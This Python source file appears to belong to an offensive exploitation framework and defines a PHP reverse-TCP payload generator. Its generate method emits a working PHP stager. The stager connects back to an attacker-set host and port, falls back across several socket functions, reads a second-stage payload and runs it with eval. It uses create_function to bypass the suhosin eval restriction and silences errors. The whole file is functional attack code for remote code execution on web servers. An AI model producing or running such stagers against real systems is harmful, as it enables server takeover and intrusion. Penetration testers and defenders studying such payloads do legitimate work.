import ipaddress
from collections.abc import Sequence

from teralibs.tsf.base.payload import Payload


class PHPReverseTCP(Payload):
    """PHP Reverse TCP."""

    OPTIONS: Sequence = ["LHOST", "LPORT", "SHELL"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.register_advanced_options(
            [
                self.opt(
                    "ReverseConnectRetries",
                    "10",
                    False,
                    "Configures the connection persistence loop within the network-based stager",
                    self.otype.INTEGER,
                )
            ]
        )

    def generate(self, ctx):
        """Generate the PHP stager payload."""
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))

        ipf = "AF_INET"
        try:
            ipaddress.IPv6Address(ctx.get_option("LHOST"))
            ipf += "6"
            host = f"[{ctx.get_option('LHOST')}]"
        except ValueError:
            pass

        # We do this so we don't get unnecessary bytes from doing a """STAGE""".
        # We can control the bytes here to remove whitespaces incase we want to
        # lower the bytes. This can be a one liner.
        php_stager = [
            "/*<?php /**/",
            "error_reporting(0);",
            f"$ip = '{host}';",
            f"$port = {port};",
            "if (($f = 'stream_socket_client') && is_callable($f)) {",
            '    $s = $f("tcp://{$ip}:{$port}");',
            "    $s_type = 'stream';",
            "}",
            "if (!$s && ($f = 'fsockopen') && is_callable($f)) {",
            "    $s = $f($ip, $port);",
            "    $s_type = 'stream';",
            "}",
            "if (!$s && ($f = 'socket_create') && is_callable($f)) {",
            f"    $s = $f({ipf}, SOCK_STREAM, SOL_TCP);",
            "    $res = @socket_connect($s, $ip, $port);",
            "    if (!$res) { die(); }",
            "    $s_type = 'socket';",
            "}",
            "if (!$s_type) {",
            "    die('no socket func');",
            "}",
            "if (!$s) { die('no socket'); }",
            "switch ($s_type) {",
            "case 'stream': $len = fread($s, 4); break;",
            "case 'socket': $len = socket_read($s, 4); break;",
            "}",
            "if (!$len) {",
            "    die();",
            "}",
            "$a = unpack('Nlen', $len);",
            "$len = $a['len'];",
            "$b = '';",
            "while (strlen($b) < $len) {",
            "    switch ($s_type) {",
            "    case 'stream': $b .= fread($s, $len-strlen($b)); break;",
            "    case 'socket': $b .= socket_read($s, $len-strlen($b)); break;",
            "    }",
            "}",
            "$GLOBALS['msgsock'] = $s;",
            "$GLOBALS['msgsock_type'] = $s_type;",
            "if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {",
            "    $suhosin_bypass=create_function('', $b);",
            "    $suhosin_bypass();",
            "} else {",
            "    eval($b);",
            "}",
            "die();",
        ]

        return "\n".join(php_stager)
